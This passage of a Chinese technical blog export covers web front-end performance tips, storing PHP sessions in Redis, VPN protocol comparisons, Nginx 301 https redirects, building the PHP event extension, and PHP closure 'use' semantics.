<p>完全避免使用 AlphaImageLoader 的最好方法就是使用 PNG8 格式来代替，这种格式能在 IE 中很好地工作。如果你确实需要使用  AlphaImageLoader，请使用下划线_filter 又使之对 IE7 以上版本的用户无效。 </p>
<h2 id="23、把脚本置于页面底部"><a href="#23、把脚本置于页面底部" class="headerlink" title="23、把脚本置于页面底部"></a>23、把脚本置于页面底部</h2><p>脚本带来的问题就是它阻止了页面的平行下载。HTTP&#x2F;1.1 规范建议，浏览器每个主机名的并行下载内容不超过两个。如果你的图片放在多个主机名上，你可以在每个并行下载中同时下载 2 个以上的文件。但是当下载脚本 时，浏览器就不会同时下载其它文件了，即便是主机名不相同。 </p>
<p>在某些情况下把脚本移到页面底部可能不太容易。比如说，如果脚本中使用了 document.write 来插入页面内容，它就不能被往下移动了。这里可能还会有作用域的问题。很多情况下，都会遇到这方面的问题。 </p>
<p>一个经常用到的替代方法就是使用延迟脚本。DEFER 属性表明脚本中没有包含 document.write，它告诉浏览器继续显示。不幸的 是，Firefox 并不支持 DEFER 属性。在 Internet Explorer 中，脚本可能会被延迟但效果也不会像我们所期望的那样。如果脚本可以被延迟，那么它就可以移到页面的底部。这会让你的页面加载的快一点。 </p>
<h2 id="24、剔除重复脚本"><a href="#24、剔除重复脚本" class="headerlink" title="24、剔除重复脚本"></a>24、剔除重复脚本</h2><p>在同一个页面中重复引用 JavaScript 文件会影响页面的性能。你可能会认为这种情况并不多见。对于美国前 10 大网站的调查显示其中有两家存在 重复引 用脚本的情况。有两种主要因素导致一个脚本被重复引用的奇怪现象发生：团队规模和脚本数量。如果真的存在这种情况，重复脚本会引起不必要的 HTTP 请求和 无用的 JavaScript 运算，这降低了网站性能。 </p>
<p>在 Internet Explorer 中会产生不必要的 HTTP 请求，而在 Firefox 却不会。在 Internet Explorer 中，如果一个脚本被引用两次而且它又不可缓存，它就会在页面加载过程中产生两次 HTTP 请求。即时脚本可以缓存，当用户重载页面时也会产 生额外的 HTTP 请求。 </p>
<p>除增加额外的 HTTP 请求外，多次运算脚本也会浪费时间。在 Internet Explorer 和 Firefox 中不管脚本是否可缓存，它们都存在重复运算 JavaScript 的问题。 </p>
<p>一个避免偶尔发生的两次引用同一脚本的方法是在模板中使用脚本管理模块引用脚本。在 HTML 页面中使用 <code>&lt;script /&gt;</code> 标签引用脚本的最常见方法就是： </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">”text/javascript”</span> <span class="attr">src</span>=<span class="string">”menu_1.0.17.js”</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<p>在 PHP 中可以通过创建名为 insertScript 的方法来替代： </p>
<p>为了防止多次重复引用脚本，这个方法中还应该使用其它机制来处理脚本，如检查所属目录和为脚本文件名中增加版本号以用于 Expire 文件头等。 </p>
<h2 id="25、减少-DOM-访问"><a href="#25、减少-DOM-访问" class="headerlink" title="25、减少 DOM 访问"></a>25、减少 DOM 访问</h2><p>使用 JavaScript 访问 DOM 元素比较慢，因此为了获得更多的应该页面，应该做到： </p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">缓存已经访问过的有关元素 </span><br><span class="line">线下更新完节点之后再将它们添加到文档树中 </span><br><span class="line">避免使用 <span class="keyword">JavaScript </span>来修改页面布局 </span><br></pre></td></tr></table></figure>

<p>有关此方面的更多信息请查看 Julien Lecomte 在 YUI 专题中的文章 “高性能 Ajax 应该程序”。 </p>
<h2 id="26、开发智能事件处理程序"><a href="#26、开发智能事件处理程序" class="headerlink" title="26、开发智能事件处理程序"></a>26、开发智能事件处理程序</h2><p>有时候我们会感觉到页面反应迟钝，这是因为 DOM 树元素中附加了过多的事件句柄并且些事件句病被频繁地触发。这就是为什么说使用 event delegation（事件代理）是一种好方法了。如果你在一个 div 中有 10 个按钮，你只需要在 div 上附加一次事件句柄就可以了，而不用去为每一个按 钮增加一个句柄。事件冒泡时你可以捕捉到事件并判断出是哪个事件发出的。 </p>
<p>你同样也不用为了操作 DOM 树而等待 onload 事件的发生。你需要做的就是等待树结构中你要访问的元素出现。你也不用等待所有图像都加载完毕。 </p>
<p>你可能会希望用 DOMContentLoaded 事件来代替 事件应用程序中的 onAvailable 方法。 </p>
<h2 id="27、减小-Cookie-体积"><a href="#27、减小-Cookie-体积" class="headerlink" title="27、减小 Cookie 体积"></a>27、减小 Cookie 体积</h2><p>HTTP coockie 可以用于权限验证和个性化身份等多种用途。coockie 内的有关信息是通过 HTTP 文件头来在 web 服务器和浏览器之间进行交流的。因此保持 coockie 尽可能的小以减少用户的响应时间十分重要。 </p>
<p>有关更多信息可以查看 Tenni Theurer 和 Patty Chi 的文章 “When the Cookie Crumbles”。这们研究中主要包括： </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">去除不必要的 coockie </span><br><span class="line">使 coockie 体积尽量小以减少对用户响应的影响 </span><br><span class="line">注意在适应级别的域名上设置 coockie 以便使子域名不受影响 </span><br><span class="line">设置合理的过期时间。较早地 Expire 时间和不要过早去清除 coockie，都会改善用户的响应时间。 </span><br></pre></td></tr></table></figure>


<h2 id="28、对于页面内容使用无-coockie-域名"><a href="#28、对于页面内容使用无-coockie-域名" class="headerlink" title="28、对于页面内容使用无 coockie 域名"></a>28、对于页面内容使用无 coockie 域名</h2><p>当浏览器在请求中同时请求一张静态的图片和发送 coockie 时，服务器对于这些 coockie 不会做任何地使用。因此他们只是因为某些负面因素而创建的 网络传输。所有你应该确定对于静态内容的请求是无 coockie 的请求。创建一个子域名并用他来存放所有静态内容。 </p>
<p>如果你的域名是 <span class="exturl" data-url="aHR0cDovL3d3dy5leGFtcGxlLm9yZyzkvaDlj6/ku6XlnKgv">www.example.org，你可以在<i class="fa fa-external-link-alt"></i></span> static.example.org 上存在静态内容。但是，如果你不是在 <span class="exturl" data-url="aHR0cDovL3d3dy5leGFtcGxlLm9yZy8=">www.example.org<i class="fa fa-external-link-alt"></i></span> 上而是在顶级域名 example.org 设置了 coockie，那么所有对于 static.example.org 的请求都包含 coockie。在这种情 况下，你可以再重新购买一个新的域名来存在静态内容，并且要保持这个域名是无 coockie 的。Yahoo! 使用的是 ymig.com，YouTube 使用的是 ytimg.com，Amazon 使用的是 images-anazon.com 等等。 </p>
<p>使用无 coockie 域名存在静态内容的另外一个好处就是一些代理（服务器）可能会拒绝对 coockie 的内容请求进行缓存。一个相关的建议就是，如果你 想确定应该使用 example.org 还是 <span class="exturl" data-url="aHR0cDovL3d3dy5leGFtcGxlLm9yZy8=">www.example.org<i class="fa fa-external-link-alt"></i></span> 作为你的一主页，你要考虑到 coockie 带来的影响。忽略掉 www 会使你除了把 coockie 设置到 <em>.example.org（</em> 是泛域名解析，代表 了所有子域名译者 dudo 注）外没有其它选择，因此出于性能方面的考虑最好是使用带有 www 的子域名并且在它上面设置 coockie。 </p>
<h2 id="29、优化图像"><a href="#29、优化图像" class="headerlink" title="29、优化图像"></a>29、优化图像</h2><p>设计人员完成对页面的设计之后，不要急于将它们上传到 web 服务器，这里还需要做几件事： </p>
<p>你可以检查一下你的 GIF 图片中图像颜色的数量是否和调色板规格一致。 使用 imagemagick 中下面的命令行很容易检查： </p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">identify -<span class="built_in">verbose</span> <span class="built_in">image</span>.gif </span><br></pre></td></tr></table></figure>

<p>如果你发现图片中只用到了 4 种颜色，而在调色板的中显示的 256 色的颜色槽，那么这张图片就还有压缩的空间。 </p>
<p>尝试把 GIF 格式转换成 PNG 格式，看看是否节省空间。大多数情况下是可以压缩的。由于浏览器支持有限，设计者们往往不太乐意使用 PNG 格式的图片，不过这 都是过去的事情了。现在只有一个问题就是在真彩 PNG 格式中的 alpha 通道半透明问题，不过同样的，GIF 也不是真彩格式也不支持半透明。因此 GIF 能 做到的，PNG（PNG8）同样也能做到（除了动画）。下面这条简单的命令可以安全地把 GIF 格式转换为 PNG 格式： </p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line"><span class="built_in">convert</span> <span class="built_in">image</span>.gif <span class="built_in">image</span>.png</span><br></pre></td></tr></table></figure>

<p>“我们要说的是：给 PNG 一个施展身手的机会吧！”</p>
<p>在所有的 PNG 图片上运行 pngcrush（或者其它 PNG 优化工具）。例如： </p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">pngcrush <span class="built_in">image</span>.png -<span class="built_in">rem</span> alla -reduce -brute result.png</span><br></pre></td></tr></table></figure>

<p>在所有的 JPEG 图片上运行 jpegtran。这个工具可以对图片中的出现的锯齿等做无损操作，同时它还可以用于优化和清除图片中的注释以及其它无用信息（如 EXIF 信息）： </p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">jpegtran </span>-copy none -optimize -perfect src.<span class="keyword">jpg </span>dest.<span class="keyword">jpg </span></span><br></pre></td></tr></table></figure>


<h2 id="30、优化-CSS-Spirite"><a href="#30、优化-CSS-Spirite" class="headerlink" title="30、优化 CSS Spirite"></a>30、优化 CSS Spirite</h2><p>在 Spirite 中水平排列你的图片，垂直排列会稍稍增加文件大小； </p>
<p>Spirite 中把颜色较近的组合在一起可以降低颜色数，理想状况是低于 256 色以便适用 PNG8 格式； </p>
<p>便于移动，不要在 Spirite 的图像中间留有较大空隙。这虽然不大会增加文件大小但对于用户代理来说它需要更少的内存来把图片解压为像素地图。100×100 的图片为 1 万像素，而 1000×1000 就是 100 万像素。 </p>
<h2 id="31、不要在-HTML-中缩放图像"><a href="#31、不要在-HTML-中缩放图像" class="headerlink" title="31、不要在 HTML 中缩放图像"></a>31、不要在 HTML 中缩放图像</h2><p>不要为了在 HTML 中设置长宽而使用比实际需要大的图片。如果你需要：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">width</span>=”100″ <span class="attribute">height</span>=”100″ <span class="attribute">src</span>=”mycat.jpg” <span class="attribute">alt</span>=”My Cat” /&gt;</span><br></pre></td></tr></table></figure>

<p>那么你的图片（mycat.jpg）就应该是 100×100 像素而不是把一个 500×500 像素的图片缩小使用。 </p>
<h2 id="32、favicon-ico-要小而且可缓存"><a href="#32、favicon-ico-要小而且可缓存" class="headerlink" title="32、favicon.ico 要小而且可缓存"></a>32、favicon.ico 要小而且可缓存</h2><p>favicon.ico 是位于服务器根目录下的一个图片文件。它是必定存在的，因为即使你不关心它是否有用，浏览器也会对它发出请求，因此最好不要 返回一 个 404 Not Found 的响应。由于是在同一台服务器上，它每被请求一次 coockie 就会被发送一次。这个图片文件还会影响下载顺序，例如在 IE 中当你在 onload 中请求额外的文件时，favicon 会在这些额外内容被加载前下载。</p>
<p>因此，为了减少 favicon.ico 带来的弊端，要做到： </p>
<p>文件尽量地小，最好小于 1K </p>
<p>在适当的时候（也就是你不要打算再换 favicon.ico 的时候，因为更换新文件时不能对它进行重命名）为它设置 Expires 文件头。你可以很安全地把 Expires 文件头设置为未来的几个月。你可以通过核对当前 favicon.ico 的上次编辑时间来作出判断。 </p>
<p>Imagemagick 可以帮你创建小巧的 favicon。 </p>
<h2 id="33、保持单个内容小于-25K"><a href="#33、保持单个内容小于-25K" class="headerlink" title="33、保持单个内容小于 25K"></a>33、保持单个内容小于 25K</h2><p>这条限制主要是因为 iPhone 不能缓存大于 25K 的文件。注意这里指的是解压缩后的大小。由于单纯 gizp 压缩可能达不要求，因此精简文件就显得十分重要。 </p>
<p>查看更多信息，请参阅 Wayne Shea 和 Tenni Theurer 的文件 “Performance Research, Part 5: iPhone Cacheability – Making it Stick”。 </p>
<h2 id="34、打包组件成复合文本"><a href="#34、打包组件成复合文本" class="headerlink" title="34、打包组件成复合文本"></a>34、打包组件成复合文本</h2><p>把页面内容打包成复合文本就如同带有多附件的 Email，它能够使你在一个 HTTP 请求中取得多个组件（切记：HTTP 请求是很奢侈的）。当你使用这条规则时，首先要确定用户代理是否支持（iPhone 就不支持）。</p>
]]></content>
      <categories>
        <category>Website</category>
      </categories>
  </entry>
  <entry>
    <title>配置 Php 的 Session 存储到 Redis</title>
    <url>/2017/10/php-session-redis/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>PHP 的会话默认是以文件的形式存在的，可以配置到 NoSQL 中。即提高了访问速度，又能很好地实现会话共享，爽歪歪！</p>
<p>配置方式如下</p>
<span id="more"></span>

<h2 id="方法一：修改-php-ini-的设置"><a href="#方法一：修改-php-ini-的设置" class="headerlink" title="方法一：修改 php.ini 的设置"></a>方法一：修改 php.ini 的设置</h2><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">session.save_handler</span> = redis</span><br><span class="line"></span><br><span class="line"><span class="attr">session.save_path</span> = <span class="string">&quot;tcp://127.0.0.1:6379&quot;</span></span><br></pre></td></tr></table></figure>

<p>修改完之后，重启一下 php-fpm。</p>
<h2 id="方式二：通过-ini-set-函数设置"><a href="#方式二：通过-ini-set-函数设置" class="headerlink" title="方式二：通过 ini_set () 函数设置"></a>方式二：通过 ini_set () 函数设置</h2><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">ini_set(<span class="string">&quot;session.save_handler&quot;</span>, <span class="string">&quot;redis&quot;</span>)<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&quot;session.save_path&quot;</span>, <span class="string">&quot;tcp://127.0.0.1:6379&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>如果配置文件 <code>/etc/redis.conf</code> 里设置了连接密码 requirepass，保存 session 的时候会报错。</p>
<p>save_path 这样写 <code>tcp://127.0.0.1:6379?auth=authpwd</code> 即可。</p>
<h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 如果未修改php.ini下面两行注释去掉</span></span><br><span class="line"><span class="comment">// ini_set(&#x27;session.save_handler&#x27;, &#x27;redis&#x27;);</span></span><br><span class="line"><span class="comment">// ini_set(&#x27;session.save_path&#x27;, &#x27;tcp://127.0.0.1:6379&#x27;);</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;sessionid&#x27;</span>] = <span class="string">&#x27;this is session content!&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;sessionid&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$redis</span> = <span class="keyword">new</span> <span class="title function_ invoke__">redis</span>();</span><br><span class="line"><span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">6379</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// redis 用 session_id 作为 key 并且是以 string 的形式存储</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;PHPREDIS_SESSION:&#x27;</span> . <span class="title function_ invoke__">session_id</span>());</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
      <tags>
        <tag>Session</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 安装配置 VPN 服务器</title>
    <url>/2017/11/linux-vpn/</url>
    <content><![CDATA[<h2 id="常见的-VPN-软件介绍"><a href="#常见的-VPN-软件介绍" class="headerlink" title="常见的 VPN 软件介绍"></a>常见的 VPN 软件介绍</h2><h4 id="OpenVPN"><a href="#OpenVPN" class="headerlink" title="OpenVPN"></a>OpenVPN</h4><span id="more"></span>

<p>OpenVPN 是一款基于 SSL 的开源 VPN 软件，它实现了利用 OpenSSL 加密库中的 SSLv3&#x2F;TLSv1 协议函数库 来保证网络通讯安全性的目的，并且允许参与建立 VPN 的单点使用共享金钥，电子证书，或者用户名 &#x2F; 密码来进行身份验证。同时避免了传统 SSL VPN</p>
<p>仅提供简单的 Web 应用的不足，它具有支持各种应用协议，以及支持 Windows，Linux，BSD，MAC OS 等多平台的特点。</p>
<p>通过阅读在 ubuntu 上安装 OpenVPN 这篇文章，我们可以在自己的电脑搭建一台属于自己的 OpenVPN 服务器。</p>
<h4 id="PPTP"><a href="#PPTP" class="headerlink" title="PPTP"></a>PPTP</h4><p>点对点隧道协议 (PPTP) 是由包括微软和 3Com 等多家公司组成的 PPTP 论坛开发的一种点对点隧道协，基于拨号使用的 PPP 协议使用 PAP 或 CHAP 等的加密算法，或者使用 Microsoft 的点对点加密算法 MPPE 。使其能通过跨越基于 TCP&#x2F;IP 协议簇的数据网络结构创建 VPN，实现了按需的、多协议的虚拟专用网络，让远程客户端到专用企业服务器之间数据的安全传输。我们可以通过这篇学习安装配置 PPTP 服务器。</p>
<h4 id="L2TP"><a href="#L2TP" class="headerlink" title="L2TP"></a>L2TP</h4><p>第 2 层隧道协议 (L2TP) 是 IETF 基于 L2F （ Cisco 的第二层转发协议）开发的 PPTP 的后续版本。是一种工业标准 的 Internet 隧道协议，其可以为跨越面向数据包的媒体发送点到点协议 (PPP) 框架提供封装。PPTP 和 L2TP 都使用 PPP 协议对数据进行封装，然后添加附加包头用于数据在互联网络上的传输。</p>
<p>PPTP 只能在两节点间建立单一隧道。 L2TP 支持在两节点间使用多隧道，用户可以针对 不同的服务创建不同的隧道。</p>
<p>L2TP 可以提供隧道验证，而 PPTP 则不支持隧道验证。但是当 L2TP 或 PPTP 与 IPSEC 共同使用时，可以由 IPSEC 提供隧道验证，不需要再在第 2 层协议上验证隧道</p>
<p>PPTP 要求互联网络为 IP 网络。L2TP 只要求隧道媒介提供面向数据包的点对点的连接，L2TP 可以在 IP（使用 UDP ），桢中继永久虚拟电路（PVCs),X.25 虚拟电路（VCs）或 ATM VCs 网络上使用</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>VPN</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx 301 重定向配置方法</title>
    <url>/2017/11/nginx-https/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>最近博客启用了 https，为了实现 <a href="http://slagga.top/">http://slagga.top</a> <span class="exturl" data-url="aHR0cDovL3d3dy5zbGFnZ2EudG9wLw==">http://www.slagga.top<i class="fa fa-external-link-alt"></i></span> <a href="https://slagga.top/">https://slagga.top</a> 用 301 重定向 <span class="exturl" data-url="aHR0cHM6Ly93d3cuc2xhZ2dhLnRvcC8=">https://www.slagga.top<i class="fa fa-external-link-alt"></i></span></p>
<p>查了很多资料 ，没有找到完美的解决方案，最终自己摸索出方案，废话少说，直接上 conf 配置代码。</p>
<span id="more"></span>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen <span class="number">80</span>;</span><br><span class="line">    server_name slagga.top www.slagga.top;</span><br><span class="line">    return <span class="number">301</span> https:<span class="regexp">//</span>www.slagga.top<span class="variable">$request_uri</span>;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">    listen <span class="number">443</span> ssl;</span><br><span class="line">    ssl_certificate  <span class="regexp">/home/</span>wwwroot<span class="regexp">/PHP7/</span>etc<span class="regexp">/tuhongweissl/</span>tuhongwei.crt;</span><br><span class="line">    ssl_certificate_key  <span class="regexp">/home/</span>wwwroot<span class="regexp">/PHP7/</span>etc<span class="regexp">/tuhongweissl/</span>tuhongwei.key;</span><br><span class="line">    server_name slagga.top;</span><br><span class="line">    return <span class="number">301</span> https:<span class="regexp">//</span>www.slagga.top<span class="variable">$request_uri</span>;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">    listen <span class="number">443</span> ssl;</span><br><span class="line">    ssl_certificate  <span class="regexp">/home/</span>wwwroot<span class="regexp">/PHP7/</span>etc<span class="regexp">/tuhongweissl/</span>tuhongwei.crt;</span><br><span class="line">    ssl_certificate_key  <span class="regexp">/home/</span>wwwroot<span class="regexp">/PHP7/</span>etc<span class="regexp">/tuhongweissl/</span>tuhongwei.key;</span><br><span class="line">    server_name  www.slagga.top;</span><br><span class="line">.......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>说明：第一段代码是将 <span class="exturl" data-url="aHR0cDovL3d3dy5zbGFnZ2EudG9wLw==">http://www.slagga.top<i class="fa fa-external-link-alt"></i></span> 和 <span class="exturl" data-url="aHR0cDovL3NsYWdnYS50b3AmbmJzcC8=">http://slagga.top&amp;nbsp<i class="fa fa-external-link-alt"></i></span> ; 301 重定向 <span class="exturl" data-url="aHR0cHM6Ly93d3cuc2xhZ2dhLnRvcC4v">https://www.slagga.top。<i class="fa fa-external-link-alt"></i></span></p>
<p>第二段代码是将 <a href="https://slagga.top/">https://slagga.top</a> 301 重定向 <span class="exturl" data-url="aHR0cHM6Ly93d3cuc2xhZ2dhLnRvcCznrKzkuInmrrXku6PnoIHkuLrmjIflrprkuLvmnLrnlKgv">https://www.slagga.top，第三段代码为指定主机用<i class="fa fa-external-link-alt"></i></span> ssl 连接，…… 为网站程序的配置文件。</p>
<p>然后用站长工具 <span class="exturl" data-url="aHR0cDovL3Rvb2wuY2hpbmF6LmNvbS9wYWdlc3RhdHVzLw==">http://tool.chinaz.com/pagestatus/<i class="fa fa-external-link-alt"></i></span> 检查下 http 状态：</p>
<h2 id="Nginx-强制启用-https-方法"><a href="#Nginx-强制启用-https-方法" class="headerlink" title="Nginx 强制启用 https 方法"></a>Nginx 强制启用 https 方法</h2><p>http 301 跳转到带 www 的 https 链接方法</p>
<p>可以看到返回状态码均为 301，所有 http 和不带 www 的域名都 301 重定向到了带 www 的 https 链接，这样有利于 SEO。</p>
<p>从网上看到另一种方式实现 nginx 链接 301 跳转到带 www https 的方法，配置如下：</p>
<pre><code>server &#123;
    listen 80;
    listen 443 ssl;
    server_name slagga.top;
    return 301 $schmeme://www.slagga.top$request_uri;
&#125;
server &#123;
    listen 80;
    server_name *.slagga.top;
    return 301 https://$host$request_uri;
&#125;
server &#123;
    listen 443 ssl;
    server_name www.slagga.top slagga.top;
    root  /home/wwwroot/PHP7/domain/aihaba.com/web$subdomain;
    ssl_certificate  /home/wwwroot/PHP7/etc/aihabacom/214014475050178.pem;
    ssl_certificate_key  /home/wwwroot/PHP7/etc/aihabacom/214014475050178.key;
 ......
&#125;

第一段代码是将 slagga.top 301 跳转到 www.slagga.top 不管是 http 还是 https 链接。

第二段代码是把任何非 https 的二级域名（www.slagga.top 实际上是个二级域名 ）跳转到 https 的对应二级域名。

第三段是应对 https 的请求，挂载 https 证书。
</code></pre>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
  </entry>
  <entry>
    <title>Php7 下安装 event 扩展</title>
    <url>/2017/11/php-event/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>有效安排 I&#x2F;O，时间和信号的扩展 使用可用于特定平台的最佳 I&#x2F;O 通知机制的事件，是 PHP 基础设施的 libevent 端口。 </p>
<p>下载地址：<span class="exturl" data-url="aHR0cDovL3BlY2wucGhwLm5ldC9wYWNrYWdlL2V2ZW50">http://pecl.php.net/package/event<i class="fa fa-external-link-alt"></i></span></p>
<span id="more"></span>

<ol>
<li><p>安装支持库 libevent，需要编译高版本（这里以最新版本 release-2.1.8-stable 为例）</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget -c https:<span class="regexp">//gi</span>thub.com<span class="regexp">/libevent/</span>libevent<span class="regexp">/releases/</span>download<span class="regexp">/release-2.1.8-stable/</span>libevent-<span class="number">2.1</span>.<span class="number">8</span>-stable.tar.gz -P <span class="regexp">/usr/</span>local/src</span><br><span class="line">cd <span class="regexp">/usr/</span>local/src</span><br><span class="line">tar -zxvf libevent-<span class="number">2.1</span>.<span class="number">8</span>-stable.tar.gz &amp;&amp; cd libevent-<span class="number">2.1</span>.<span class="number">8</span>-stable</span><br><span class="line">.<span class="regexp">/configure --prefix=/u</span>sr<span class="regexp">/local/</span>libevent-<span class="number">2.1</span>.<span class="number">8</span></span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装 event 库（以 event-2.3.0.tgz 为例）</p>
<figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line">wget -c http:<span class="comment">//pecl.php.net/get/event-2.3.0.tgz -P /usr/local/src</span></span><br><span class="line">cd /usr/<span class="keyword">local</span>/src</span><br><span class="line">tar -zxvf <span class="keyword">event</span>-<span class="number">2</span><span class="variable">.3</span><span class="variable">.0</span><span class="variable">.tgz</span> &amp;&amp; cd <span class="keyword">event</span>-<span class="number">2</span><span class="variable">.3</span><span class="variable">.0</span></span><br><span class="line">/usr/<span class="keyword">local</span>/php/bin/phpize</span><br><span class="line">./configure --<span class="keyword">with</span>-php-<span class="keyword">config</span>=/usr/<span class="keyword">local</span>/php/bin/php-<span class="keyword">config</span> --<span class="keyword">with</span>-<span class="keyword">event</span>-libevent-dir=/usr/<span class="keyword">local</span>/libevent-<span class="number">2</span><span class="variable">.1</span><span class="variable">.8</span>/</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
</li>
<li><p>在 php.ini 添加下面配置</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">extension</span><span class="operator">=</span>event.so</span><br></pre></td></tr></table></figure></li>
</ol>
<p>重启 php-fpm 后，使用 <code>php -m | grep event</code> 查看 event 库插件是否安装成功</p>
]]></content>
      <categories>
        <category>Php</category>
      </categories>
  </entry>
  <entry>
    <title>关于 php 匿名函数中的 use</title>
    <url>/2017/11/php-use/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>匿名函数中的 use，其作用就是从父作用域继承变量。 </p>
<p>下例是最常见的用法，如果不使用 use，函数中将找不到变量 $msg。</p>
<span id="more"></span>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$msg</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="variable">$func</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)<span class="keyword">use</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$msg</span>);</span><br><span class="line">&#125;;  </span><br><span class="line"></span><br><span class="line"><span class="variable">$func</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行输出</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="number">1</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="number">2</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="number">3</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h2 id="关于继承变量的时机"><a href="#关于继承变量的时机" class="headerlink" title="关于继承变量的时机"></a>关于继承变量的时机</h2><p>继承变量的行为是在函数定义时产生还是在函数调用时产生？我们调整下上例中代码的顺序，将 $msg 置于函数定义之后。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)<span class="keyword">use</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$msg</span>);</span><br><span class="line">&#125;;  </span><br><span class="line"></span><br><span class="line"><span class="variable">$msg</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$func</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行输出</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">PHP <span class="keyword">Notice</span>:  Undefined variable: msg <span class="keyword">in</span> /<span class="keyword">search</span>/ballqiu/c.php <span class="keyword">on</span> <span class="type">line</span> <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>可见，继承变量的行为是在函数定义时产生的。上例中定义 func 时，没有找到外部的 msg，所以函数运行时 $msg 就是未定义变量。</p>
<h2 id="关于-use-中使用引用传值"><a href="#关于-use-中使用引用传值" class="headerlink" title="关于 use 中使用引用传值"></a>关于 use 中使用引用传值</h2><p>我们知道，在匿名函数的 use 中如果使用引用传值，那么匿名函数中对参数值的改变会同样影响外部相应变量。比如下面的例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$msg</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="variable">$func</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)<span class="keyword">use</span>(<span class="params">&amp;<span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span>[<span class="number">0</span>]++;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$msg</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable">$func</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$msg</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行输出</p>
